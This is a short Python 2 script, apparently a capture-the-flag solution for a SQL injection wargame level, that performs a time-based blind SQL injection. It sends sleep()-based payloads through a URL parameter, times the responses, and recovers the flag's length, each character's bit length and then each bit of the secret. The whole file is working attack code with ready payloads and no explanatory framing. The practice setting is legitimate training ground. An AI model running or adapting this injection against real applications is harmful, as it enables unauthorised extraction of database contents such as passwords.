#-*- coding: utf-8 -*-
from time import *
from web import *

url = "http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag={}"

start_t = 0
end_t = 0

# get length
length = 0
inject_url = "sleep((length(flag)={})*2)+1-~0#"

for i in range(10000):
    start_t = time()
    req = getRequest(url, inject_url.format(i), show=False)
    page = getPage(req)
    end_t = time()
    if end_t - start_t > 2:
        print "Length :", i
        length = i
        break

# set Char length
inject_url = "sleep((length(bin(ascii(substr(flag from {} for 1))))={})*2)+1-~0#"
chr_length = []

for i in range(1,length+1):
    for j in range(1,100):
        start_t = time()
        req = getRequest(url, inject_url.format(i,j),show=False)
        page = getPage(req)
        end_t = time()
        if end_t - start_t > 2:
            chr_length.append(j)
            print chr_length
            break

print "Check bit length :",chr_length

# get password : brute forcing : for admin
password = []
inject_url = "sleep((substr(bin(ord(substr(flag from {} for 1))) from {} for 1)=1)*2)+1-~0#"

for i in range(1,length+1):
    tmp = ""
    for j in range(1, chr_length[i-1]+1):
        start_t = time()
        req = getRequest(url, inject_url.format(i,j), show=False)
        page = getPage(req)
        end_t = time()
        if end_t - start_t > 2: tmp += "1"
        else: tmp += "0"
        print tmp

    password.append(chr(int(tmp,2)))
    print password

print "Password :","".join(password)
